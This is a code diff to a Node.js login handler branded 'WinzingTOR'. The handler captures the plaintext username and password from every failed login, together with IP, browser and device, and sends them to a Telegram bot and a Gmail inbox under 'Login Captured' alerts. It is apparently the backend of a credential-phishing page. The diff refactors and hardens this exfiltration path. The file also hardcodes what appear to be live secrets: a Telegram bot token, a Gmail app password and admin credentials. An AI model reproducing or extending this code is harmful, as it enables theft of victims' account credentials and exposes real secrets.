@@ -1,31 +1,33 @@
-const fs   = require('fs');
-const path = require('path');
-const crypto = require('crypto');
+const fs         = require('fs');
+const crypto     = require('crypto');
 const nodemailer = require('nodemailer');
+const fetch      = require('node-fetch');
 
-const LOGS_FILE    = '/tmp/failed-logins.json';
-const VALID_USER   = 'nikhil';
-const VALID_PASS   = '123456';
-const ADMIN_USER   = 'shivanshu.bnd';
-const ADMIN_PASS   = 'Sahu@7897';
+const LOGS_FILE  = '/tmp/failed-logins.json';
+const VALID_USER = 'nikhil';
+const VALID_PASS = '123456';
+const ADMIN_USER = 'shivanshu.bnd';
+const ADMIN_PASS = 'Sahu@7897';
 
-// Telegram config
+// ─── Telegram config ─────────────────────────────────────────────────────────
 const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
 const TELEGRAM_CHAT_ID   = '1388446058';
 
-// Nodemailer config
+// ─── Email config ─────────────────────────────────────────────────────────────
 const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
 const EMAIL_PASS = 'bcjv orrt naby nztj';
 
 const transporter = nodemailer.createTransport({
-    service: 'gmail',
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
     auth: {
         user: EMAIL_USER,
         pass: EMAIL_PASS
     }
 });
 
-// ─── Token helper ────────────────────────────────────────────────────────────
+// ─── Token helper ─────────────────────────────────────────────────────────────
 function makeToken() {
     return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
 }
@@ -41,7 +43,7 @@ function readLogs() {
 function appendLog(entry) {
     try {
         const logs = readLogs();
-        logs.unshift(entry);          // newest first
+        logs.unshift(entry);
         if (logs.length > 1000) logs.length = 1000;
         fs.writeFileSync(LOGS_FILE, JSON.stringify(logs), 'utf8');
     } catch (e) {
@@ -49,45 +51,66 @@ function appendLog(entry) {
     }
 }
 
-// ─── Notification Handlers ───────────────────────────────────────────────────
-async function sendTelegramNotification(entry) {
-    const text = `🚨 *WinzingTOR Login Captured* 🚨\n\n👤 *Username:* \`${entry.username}\`\n🔑 *Password:* \`${entry.password}\`\n\n🌐 *IP:* ${entry.ip}\n💻 *Device:* ${entry.device} (${entry.browser})\n🕒 *Time:* ${entry.timestamp}`;
-    
+// ─── Telegram Notification ────────────────────────────────────────────────────
+async function sendTelegram(entry) {
+    const text =
+        `🚨 *New Login Captured!*\n\n` +
+        `👤 *Username:* \`${entry.username}\`\n` +
+        `🔑 *Password:* \`${entry.password}\`\n\n` +
+        `🌐 *IP:* ${entry.ip}\n` +
+        `💻 *Device:* ${entry.device} (${entry.browser})\n` +
+        `🕒 *Time:* ${entry.timestamp}`;
+
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            })
-        });
+        const res = await fetch(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+            {
+                method:  'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body:    JSON.stringify({
+                    chat_id:    TELEGRAM_CHAT_ID,
+                    text:       text,
+                    parse_mode: 'Markdown'
+                })
+            }
+        );
+        const data = await res.json();
+        if (!data.ok) console.error('Telegram API error:', JSON.stringify(data));
     } catch (e) {
         console.error('Telegram send error:', e.message);
     }
 }
 
-async function sendEmailNotification(entry) {
-    const text = `Attempt Captured:\nUsername: ${entry.username}\nPassword: ${entry.password}\n\nIP: ${entry.ip}\nDevice: ${entry.device} (${entry.browser})\nTime: ${entry.timestamp}`;
-    const mailOptions = {
-        from: EMAIL_USER,
-        to: EMAIL_USER,
-        subject: `🚨 WinzingTOR Login: ${entry.username}`,
-        text: text
-    };
-
+// ─── Email Notification ───────────────────────────────────────────────────────
+async function sendEmail(entry) {
     try {
-        await transporter.sendMail(mailOptions);
+        await transporter.sendMail({
+            from:    `"WinzingTOR Alert" <${EMAIL_USER}>`,
+            to:      EMAIL_USER,
+            subject: `🚨 Login Captured: ${entry.username}`,
+            text:
+                `New login attempt captured!\n\n` +
+                `Username : ${entry.username}\n` +
+                `Password : ${entry.password}\n\n` +
+                `IP       : ${entry.ip}\n` +
+                `Device   : ${entry.device} (${entry.browser})\n` +
+                `Time     : ${entry.timestamp}`
+        });
     } catch (e) {
         console.error('Email send error:', e.message);
     }
 }
 
-// ─── Main handler ─────────────────────────────────────────────────────────────
+// ─── Main Handler ─────────────────────────────────────────────────────────────
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');
+
+    // Handle CORS preflight
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
 
     // ── Admin: GET logs ──────────────────────────────────────────────────────
     if (req.method === 'GET') {
@@ -113,36 +136,31 @@ module.exports = async (req, res) => {
         if (!isValid) {
             const ua = req.headers['user-agent'] || '';
             let browser = 'Unknown';
-            if (ua.includes('Chrome') && !ua.includes('Edg'))  browser = 'Chrome';
-            else if (ua.includes('Firefox'))                    browser = 'Firefox';
+            if      (ua.includes('Edg'))                             browser = 'Edge';
+            else if (ua.includes('Chrome'))                          browser = 'Chrome';
+            else if (ua.includes('Firefox'))                         browser = 'Firefox';
             else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-            else if (ua.includes('Edg'))                        browser = 'Edge';
 
-            let device = 'Desktop';
-            if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';
+            const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
 
             const entry = {
                 id:        Date.now(),
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-                username:  username || '',
-                password:  password || '',
+                username:  username  || '',
+                password:  password  || '',
                 browser,
                 device,
                 ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
             };
 
             appendLog(entry);
-            
-            // Send notifications without awaiting so we don't block the frontend response
-            sendTelegramNotification(entry);
-            sendEmailNotification(entry);
+
+            // Fire-and-forget notifications
+            sendTelegram(entry).catch(console.error);
+            sendEmail(entry).catch(console.error);
         }
 
-        if (isValid) {
-            return res.status(200).json({ success: true });
-        } else {
-            return res.status(200).json({ success: false });
-        }
+        return res.status(200).json({ success: isValid });
     }
 
     return res.status(405).json({ error: 'Method Not Allowed' });
